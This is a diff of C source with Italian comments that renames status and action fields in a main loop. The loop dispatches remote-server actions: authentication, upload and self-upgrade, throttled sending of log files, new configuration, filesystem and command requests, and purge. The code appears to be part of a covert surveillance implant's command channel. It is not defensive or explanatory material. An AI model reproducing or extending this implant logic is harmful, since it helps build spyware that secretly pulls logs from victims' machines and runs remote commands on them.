@@ -69,6 +69,7 @@ BOOL ASP_StartASPThread(DWORD dwPid, ASP_THREAD *asp_thread)
 	return TRUE;
 }
 
+
 ////////////////////////////////////
 // Funzioni IPC command per ASP   //
 ////////////////////////////////////
@@ -987,46 +988,46 @@ void WINAPI ASP_MainLoop(char *asp_server)
 		reply_setup = (ASP_REPLY_SETUP *)ASP_IPC_command->out_param;
 		reply_setup->server_addr = inet_addr(server_ip);
 		reply_setup->server_port = server_port;
-		ASP_IPC_command->status = ASP_DONE;
+		ASP_IPC_command->ctrl.status = ASP_DONE;
 	} else
-		ASP_IPC_command->status = ASP_ERROR;
+		ASP_IPC_command->ctrl.status = ASP_ERROR;
 
 	LOOP {
 		Sleep(ASP_SLEEP_TIME);
 		// Se non ha comandi da eseguire
-		if (ASP_IPC_command->status != ASP_FETCH)
+		if (ASP_IPC_command->ctrl.status != ASP_FETCH)
 			continue;
 
 		// Esegue la spedizione/ricezione dei dati a seconda dell'action
-		if (ASP_IPC_command->action == ASP_AUTH) {
+		if (ASP_IPC_command->ctrl.action == ASP_AUTH) {
 			ret_success = doAuth((ASP_REQUEST_AUTH*)ASP_IPC_command->in_param);
 
-		} else if (ASP_IPC_command->action == ASP_BYE) {
+		} else if (ASP_IPC_command->ctrl.action == ASP_BYE) {
 			ret_success = doBye();
 
-		} else if (ASP_IPC_command->action == ASP_IDBCK) {
+		} else if (ASP_IPC_command->ctrl.action == ASP_IDBCK) {
 			ASP_REQUEST_ID *ri  = (ASP_REQUEST_ID *)ASP_IPC_command->in_param;
 			message = H_ASP_ID(ri->username, ri->device, L"", &msg_len);
 			ret_success = (BOOL)message;
 			ASP_REPORT_MESSAGE_BACK;
 
-		} else if (ASP_IPC_command->action == ASP_UPLO || ASP_IPC_command->action == ASP_UPGR) {
+		} else if (ASP_IPC_command->ctrl.action == ASP_UPLO || ASP_IPC_command->ctrl.action == ASP_UPGR) {
 			ASP_REPLY_UPLOAD *ru  = (ASP_REPLY_UPLOAD *)ASP_IPC_command->out_param;
 			WCHAR *file_name = NULL;
 			BOOL is_upload = FALSE;
 			// Verifica se si tratta di un upload o di un upgrade
-			if (ASP_IPC_command->action == ASP_UPLO) 
+			if (ASP_IPC_command->ctrl.action == ASP_UPLO)
 				is_upload = TRUE;
 			ret_success = H_ASP_GetUpload(is_upload, &ASP_IPC_command->out_command, &file_name, &ru->upload_left);
 			if (file_name)
 				_snwprintf_s(ru->file_name, sizeof(ru->file_name)/sizeof(WCHAR), _TRUNCATE, L"%s", file_name);		
 			SAFE_FREE(file_name);
 
-		} else if (ASP_IPC_command->action == ASP_SLOG) {
+		} else if (ASP_IPC_command->ctrl.action == ASP_SLOG) {
 			ASP_REQUEST_LOG *rl  = (ASP_REQUEST_LOG *)ASP_IPC_command->in_param;
 			ret_success = H_ASP_SendFile(rl->file_name, rl->byte_per_second, &ASP_IPC_command->out_command); 
 			
-		} else if (ASP_IPC_command->action == ASP_NCONF) {
+		} else if (ASP_IPC_command->ctrl.action == ASP_NCONF) {
 			ASP_REQUEST_CONF *rc = (ASP_REQUEST_CONF *)ASP_IPC_command->in_param;
 			ret_success = H_ASP_GenericCommand(PROTO_NEW_CONF, &ASP_IPC_command->out_command, &message, &msg_len);
 			if (ret_success && ASP_IPC_command->out_command == PROTO_OK) {
@@ -1037,29 +1038,29 @@ void WINAPI ASP_MainLoop(char *asp_server)
 			}
 			SAFE_FREE(message);	
 
-		} else if (ASP_IPC_command->action == ASP_DOWN) {
+		} else if (ASP_IPC_command->ctrl.action == ASP_DOWN) {
 			ret_success = H_ASP_GenericCommand(PROTO_DOWNLOAD, &ASP_IPC_command->out_command, &message, &msg_len);
 			ASP_REPORT_MESSAGE_BACK;
 	
-		} else if (ASP_IPC_command->action == ASP_FSYS) {
+		} else if (ASP_IPC_command->ctrl.action == ASP_FSYS) {
 			ret_success = H_ASP_GenericCommand(PROTO_FILESYSTEM, &ASP_IPC_command->out_command, &message, &msg_len);
 			ASP_REPORT_MESSAGE_BACK;
 
-		} else if (ASP_IPC_command->action == ASP_CMDE) {
+		} else if (ASP_IPC_command->ctrl.action == ASP_CMDE) {
 			ret_success = H_ASP_GenericCommand(PROTO_COMMANDS, &ASP_IPC_command->out_command, &message, &msg_len);
 			ASP_REPORT_MESSAGE_BACK;
 
-		} else if (ASP_IPC_command->action == ASP_SSTAT) {
+		} else if (ASP_IPC_command->ctrl.action == ASP_SSTAT) {
 			ret_success = H_ASP_GenericCommandPL(PROTO_LOGSTATUS, ASP_IPC_command->in_param, sizeof(ASP_REQUEST_STAT), &ASP_IPC_command->out_command, &message, &msg_len);
 			SAFE_FREE(message);
 
-		}  else if (ASP_IPC_command->action == ASP_PURGE) {
+		}  else if (ASP_IPC_command->ctrl.action == ASP_PURGE) {
 			ret_success = H_ASP_GenericCommand(PROTO_PURGE, &ASP_IPC_command->out_command, &message, &msg_len);
 			ASP_REPORT_MESSAGE_BACK;
 
 		}
 
 		// Notifica la fine delle operazioni di lettura/scrittura
-		ASP_IPC_command->status = (ret_success) ? ASP_DONE : ASP_ERROR;
+		ASP_IPC_command->ctrl.status = (ret_success) ? ASP_DONE : ASP_ERROR;
 	}
 }
